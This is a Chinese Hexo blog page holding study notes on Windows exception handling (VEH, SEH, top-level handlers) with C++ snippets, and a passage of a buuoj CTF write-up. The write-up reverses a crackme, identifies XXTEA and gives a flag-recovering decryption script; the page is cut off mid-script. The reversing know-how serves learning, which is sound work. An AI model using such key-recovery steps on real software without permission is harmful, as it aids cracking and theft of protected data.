<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  

  
  
  
  
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/css/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  

  
  <!-- baidu webmaster push -->
  <script src='//push.zhanzhang.baidu.com/push.js'></script>
<meta name="generator" content="Hexo 5.2.0"></head>
<body class="home blog custom-background custom-font-enabled single-author">
  <div id="page" class="hfeed site">
      <header id="masthead" class="site-header" role="banner">
    <hgroup>
      <h1 class="site-title">
        <a href="/" title="Hexo" rel="home">Hexo</a>
      </h1>
      
        <h2 class="site-description hitokoto"></h2>
        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
      
    </hgroup>

    <nav id="site-navigation" class="main-navigation" role="navigation">
            <button class="menu-toggle">菜单</button>
            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
            <div class="menu-main-container">
                <ul id="menu-main" class="nav-menu">
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
                
                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
                
                </ul>
            </div>
    </nav>
</header>

      <div id="main" class="wrapper">
        <div id="primary" class="site-content"><div id="content" role="main">
  
    <article id="post-note/rev/win-ehs" class="post-note/rev/win-ehs post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/28/note/rev/win-ehs/">windows异常处理机制</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/28/note/rev/win-ehs/" data-id="ckgzthi460004u0wb6fllck14" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><ul>
<li><p>SEH：结构化异常处理</p>
</li>
<li><p>VEH向量化异常处理</p>
</li>
<li><p>TopLevelEH顶层异常处理</p>
</li>
</ul>
<p>每种处理方法都可以三种值，在不同处理方法下意义不同</p>
<ul>
<li><p>EXCEPTION_EXECUTE_HANDLER</p>
<p>该异常被处理，从异常处下一条指令开始执行</p>
</li>
<li><p>EXCEPTION_CONTINUE_SEARCH</p>
<p>不处理该异常</p>
</li>
<li><p>EXCEPTION_CONTINUE_EXECUTIOIN</p>
<p>忽略异常，从异常处继续执行</p>
</li>
</ul>
<p>如果当前进程正在被调试，调试器也可以返回值</p>
<ul>
<li><p>DBG_CONTINUE</p>
<p>等同于EXCEPTION_CONTINUE_EXECUTION</p>
</li>
<li><p>DBG_EXCEPTION_NOT_HANDLED</p>
<p>等同于EXCEPTION_CONTINUE_SEARCH</p>
</li>
</ul>
<p>异常处理器包含内核异常处理和R3异常处理</p>
<h2 id="R3程序产生异常时，异常处理器处理顺序："><a href="#R3程序产生异常时，异常处理器处理顺序：" class="headerlink" title="R3程序产生异常时，异常处理器处理顺序："></a>R3程序产生异常时，异常处理器处理顺序：</h2><ol>
<li><p>交给调试器</p>
</li>
<li><p>执行VEH</p>
</li>
<li><p>执行SEH</p>
</li>
<li><p>TopLevelEH</p>
</li>
<li><p>交给调试器</p>
</li>
<li><p>调试异常端口通知csrss.exe</p>
</li>
</ol>
<h3 id="第一次交给调试器"><a href="#第一次交给调试器" class="headerlink" title="第一次交给调试器"></a>第一次交给调试器</h3><p>判断是否处理该异常</p>
<ul>
<li><p>处理返回DBG_CONTINUE</p>
</li>
<li><p>否则返回DBG_EXECUTE_NOT_HANDLED</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(!bExit)</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;</span><br><span class="line">    DEBUG_EVENT debugEvent;</span><br><span class="line">    WaitForDebugEvent(&amp;debugEvent, INFINITE);</span><br><span class="line">    <span class="keyword">switch</span> ( debugEvent.dwDebugEventCode )</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> EXCEPTION_DEBUG_EVENT:</span><br><span class="line">        &#123;</span><br><span class="line">            EXCEPTION_DEBUG_INFO* pExcpInfo = &amp;debugEvent.u.Exception;</span><br><span class="line">            <span class="keyword">if</span> ( MessageBox(<span class="number">0</span>,_T(<span class="string">&quot;处理该异常?&quot;</span>), _T(<span class="string">&quot;我是调试器&quot;</span>),MB_YESNO)==IDYES )</span><br><span class="line">            &#123;</span><br><span class="line">                dwContinueStatus = DBG_CONTINUE;</span><br><span class="line">                <span class="comment">//...</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">    ContinueDebugEvent(debugEvent.dwProcessId,  debugEvent.dwThreadId, dwContinueStatus);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="执行VEH"><a href="#执行VEH" class="headerlink" title="执行VEH"></a>执行VEH</h3><p>如果没有被调试，或者调试器不处理该异常(返回DBG_EXCEPTION_NOT_HANDLED)，就会把异常交给VEH</p>
<p>VEH是个链表，每个VEH按顺序调用</p>
<p>VEH在SEH之前执行，不依赖某一线程，返回值：</p>
<ul>
<li><p>EXCEPTION_CONTINUE_SEARCH 交给下一个VEH</p>
</li>
<li><p>EXCEPTION_CONTINUE_EXECUTION 认为已被处理，退出异常处理器在异常指令处继续执行</p>
</li>
<li><p>EXCEPTION_EXECUTE_HANDLED 无效，等同于EXCEPTION_CONTINUE_SEARCH</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG NTAPI <span class="title">FirstVectExcepHandler</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( ... )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//参数1=1表示插入Veh链的头部，=0表示插入到VEH链的尾部</span></span><br><span class="line">AddVectoredExceptionHandler( <span class="number">1</span>, &amp;FirstVectExcepHandler );</span><br></pre></td></tr></table></figure>
<h3 id="执行SEH"><a href="#执行SEH" class="headerlink" title="执行SEH"></a>执行SEH</h3><p>当所有的VEH都不处理该异常，该异常就会让SEH处理，SEH只能处理自己线程的异常，基于线程栈的异常处理机制</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">FirstSEHer</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pTitle = _T(<span class="string">&quot;第一个SEH处理器&quot;</span>);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][1] in \n&quot;</span>) );</span><br><span class="line">    LONG nRet = ShowSelectMessageBox(pTitle);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][1] out \n&quot;</span>) );</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LONG <span class="title">SecondSEHer</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pTitle = _T(<span class="string">&quot;第二个SEH处理器&quot;</span>);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][2] in \n&quot;</span>) );</span><br><span class="line">    LONG nRet = ShowSelectMessageBox(pTitle);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][2] out \n&quot;</span>) );;</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ExcepFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        __try</span><br><span class="line">        &#123;</span><br><span class="line">            __try</span><br><span class="line">            &#123;</span><br><span class="line"> </span><br><span class="line">                _tprintf( _T(<span class="string">&quot;[EH.Exe] *[CALL] int 3\n&quot;</span>) );</span><br><span class="line">                __asm <span class="keyword">int</span> <span class="number">3</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            __finally</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>( <span class="string">&quot;[EH.Exe] *[SEH][0] finally call...\n&quot;</span> );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        __except( FirstSEHer(GetExceptionInformation()) )</span><br><span class="line">        &#123;</span><br><span class="line">            _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][1] 被俺处理了~(只有返回EXCEPTION_EXECUTE_HANDLER才会走到这里)\n&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except( SecondSEHer(GetExceptionInformation()) )</span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf( _T(<span class="string">&quot;[EH.Exe] [SEH][2] 被俺处理了(只有返回EXCEPTION_EXECUTE_HANDLER才会走到这里)\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="执行TopLevelEH"><a href="#执行TopLevelEH" class="headerlink" title="执行TopLevelEH"></a>执行TopLevelEH</h3><p>利用SEH实现，但是可以处理所有线程抛出的异常。如果正在被调试，则顶层异常会被忽略。</p>
<p>返回值：</p>
<ul>
<li><p>EXCEPTION_CONTINUE_SEARCH</p>
<p>查注册表，如果存在调试器，则抛给调试器</p>
<p>注册表路径：KLM\software\microsoft\windows nt\currentvsrsion\aedebug。如果Auto==1，Debugger!=NULL</p>
</li>
<li><p>EXCEPTION_EXECUTE_HANDLER</p>
<p>杀死该进程</p>
</li>
<li><p>EXCEPTION_CONTINUE_EXECUTION</p>
<p>和SEH一样</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG NTAPI <span class="title">TopLevelExcepFilter</span><span class="params">( PEXCEPTION_POINTERS pExcepInfo )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TCHAR* pTitle = _T(<span class="string">&quot;*顶级* 异常处理器&quot;</span>);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [TOP] in \n&quot;</span>) );</span><br><span class="line">    LONG nRet = ShowSelectMessageBox(pTitle);</span><br><span class="line">    _tprintf( _T(<span class="string">&quot;[EH.Exe] [TOP] out \n&quot;</span>) );;</span><br><span class="line">    <span class="keyword">return</span> nRet;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//注册</span></span><br><span class="line">SetUnhandledExceptionFilter( &amp;TopLevelExcepFilter );</span><br></pre></td></tr></table></figure>
<h3 id="再次交给调试器"><a href="#再次交给调试器" class="headerlink" title="再次交给调试器"></a>再次交给调试器</h3><p>返回值</p>
<ul>
<li><p>DBG_CONTINUE</p>
<p>和第一次相同</p>
</li>
<li><p>DBG_EXCEPTION_NOT_HANDLED</p>
<p>直接杀死进程</p>
</li>
</ul>
<h3 id="调试异常端口通知csrss-exe"><a href="#调试异常端口通知csrss-exe" class="headerlink" title="调试异常端口通知csrss.exe"></a>调试异常端口通知csrss.exe</h3><p>上面的异常处理机制都没有处理该异常，则调用csrss.exe，弹出一个对话框</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-173853.htm">[原创]白话windows之四 异常处理机制(VEH、SEH、TopLevelEH…)</a></p>

      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/28/note/rev/win-ehs/">
    <time datetime="2020-10-28T00:35:26.000Z" class="entry-date">
        2020-10-28
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-note/rev/ehs" class="post-note/rev/ehs post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/27/note/rev/ehs/">Windows异常处理机制</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/27/note/rev/ehs/" data-id="ckgs4j4q50000o4wb66ys1bqw" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        
      
    </div><!-- .entry-content -->

    <footer class="entry-meta">
    <a href="/2020/10/27/note/rev/ehs/">
    <time datetime="2020-10-27T11:01:03.000Z" class="entry-date">
        2020-10-27
    </time>
</a>
    
    
    </footer>
</article>






  
    <article id="post-writeup/buuoj/wp" class="post-writeup/buuoj/wp post type-post status-publish format-standard hentry">
    <!---->

      <header class="entry-header">
        
        
  
    <h1 class="entry-title">
      <a class="article-title" href="/2020/10/22/writeup/buuoj/wp/">buuoj writeup</a>
    </h1>
  

        
        <div class="comments-link">
            
            <a href="javascript:void(0);" data-url="http://example.com/2020/10/22/writeup/buuoj/wp/" data-id="ckgkfi3uk0001f4wb6u6fb4rs" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
        </div><!-- .comments-link -->
      </header><!-- .entry-header -->

    <div class="entry-content">
      
        <p>这篇博客记录buuoj上面刷题时学到东西题</p>
<h2 id="rev-红帽杯2019-xx"><a href="#rev-红帽杯2019-xx" class="headerlink" title="[rev][红帽杯2019]xx"></a>[rev][红帽杯2019]xx</h2><p>找main函数：</p>
<ol>
<li><p>有三个参数，也可能两个</p>
</li>
<li><p>下面有个函数使用了main函数的返回值</p>
</li>
</ol>
<p>根据这两个特点</p>
<p>sub1400020F中的这段代码值得注意</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    register_thread_local_exe_atexit_callback(*v12);</span><br><span class="line">  get_initial_narrow_environment(v11);</span><br><span class="line">  v14 = *(_QWORD *)_p___argv(v13);</span><br><span class="line">  v16 = (<span class="keyword">unsigned</span> <span class="keyword">int</span> *)_p___argc(v15);</span><br><span class="line">  a1 = sub_1400011A0(*v16, v14);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int8)sub_140002790(v17) )</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">exit</span>(a1);</span><br></pre></td></tr></table></figure>
<p>可以看出sub_140011A0就是main</p>
<p>进入main函数分析</p>
<ol>
<li><p>最后检测逻辑</p>
<p>对某个数组进行置换并且置换之后进行了异或</p>
</li>
<li><p>再往前的变换逻辑</p>
<p>用户输入被送进了一个函数，返回值用来做检测</p>
</li>
<li><p>进入那个函数</p>
<p>看起来像tea加密(0x9E3779B9)</p>
<p>想起来加密与解密中介绍了tea的变种，网上搜索，发现是xxtea加密</p>
</li>
</ol>
<p>解密脚本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="comment">// #include &quot;defs.h&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> align4(x) (((x)&amp;3)?(x&gt;&gt;2):((x&gt;&gt;2)+1))</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELTA 0x9e3779b9  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MX (((z&gt;&gt;5^y<span class="meta-string">&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))  </span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printArray</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,<span class="keyword">uint8_t</span> *v,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;========%s=========\n&quot;</span>,name);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X,&quot;</span>,v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n=================\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">btea</span><span class="params">(<span class="keyword">uint32_t</span> *v, <span class="keyword">int</span> n, <span class="keyword">uint32_t</span> <span class="keyword">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="keyword">unsigned</span> p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)            <span class="comment">/* Coding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = <span class="number">0</span>; p&lt;n - <span class="number">1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p + <span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">/* Decoding Part */</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span> / n;</span><br><span class="line">        sum = rounds*DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p = n - <span class="number">1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p - <span class="number">1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n - <span class="number">1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xxTeaDecrypt</span><span class="params">(<span class="keyword">uint8_t</span> *cdata,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> data[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(data,cdata,<span class="number">0x18</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> key[<span class="number">4</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    key[<span class="number">0</span>] = <span class="string">&#x27;f&#x27;</span>+(<span class="string">&#x27;l&#x27;</span>&lt;&lt;<span class="number">8</span>)+(<span class="string">&#x27;a&#x27;</span>&lt;&lt;<span class="number">16</span>)+(<span class="string">&#x27;g&#x27;</span>&lt;&lt;<span class="number">24</span>);</span><br><span class="line">    printArray(<span class="string">&quot;key&quot;</span>,(<span class="keyword">uint8_t</span>*)key,<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%x\n&quot;</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    btea(data,<span class="number">-6</span>,key);</span><br><span class="line">    printArray(<span class="string">&quot;cdata&quot;</span>,(<span class="keyword">uint8_t</span> *)cdata,<span class="number">0x18</span>);</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,(<span class="keyword">uint8_t</span>*)data,<span class="number">0x18</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buf[<span class="number">0x18</span>];</span><br><span class="line">    *(<span class="keyword">int64_t</span> *)&amp;buf[<span class="number">0</span>]=<span class="number">0xC0953A7C6B40BCCE</span>LL;</span><br><span class="line">    *(<span class="keyword">int64_t</span> *)&amp;buf[<span class="number">8</span>]=<span class="number">0x3502F79120209BEF</span>LL;</span><br><span class="line">    *(<span class="keyword">int32_t</span> *)&amp;buf[<span class="number">16</span>]=<span class="number">0xC8021823</span>;</span><br><span class="line">    *(<span class="keyword">int32_t</span> *)&amp;buf[<span class="number">20</span>]=<span class="number">0xFA5656E7</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> cipher[<span class="number">0x18</span>];</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * v20=0,1,2</span></span><br><span class="line"><span class="comment">    * v20=3,4,5 buf[3,4,5]^=buf[0]^buf[1]</span></span><br><span class="line"><span class="comment">    * v20=6,7,8 buf[6,7,8]^=buf[0]^buf[1]^buf[2]</span></span><br><span class="line"><span class="comment">    * v20=9,10,11 buf[9,10,11]^=buf[0]^buf[1]^buf[2]^buf[3]</span></span><br><span class="line"><span class="comment">    * ...</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0x18</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i/<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">uint8_t</span> j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">do</span>&#123;</span><br><span class="line">                buf[i]^=buf[j];</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">while</span>(j&lt;i/<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cipher[<span class="number">2</span>]=buf[<span class="number">0</span>];</span><br><span class="line">    cipher[<span class="number">0</span>]=buf[<span class="number">1</span>];</span><br><span class="line">    cipher[<span class="number">3</span>]=buf[<span class="number">2</span>];</span><br><span class="line">    cipher[<span class="number">1</span>]=buf[<span class="number">3</span>];</span><br><span class="line">    cipher[<span class="number">6</span>]=buf[<span class="number">4</span>];</span><br><span class="line">    cipher[<span class="number">4</span>]=buf[<span class="number">5</span>];</span><br><span class="line">    cipher[<span 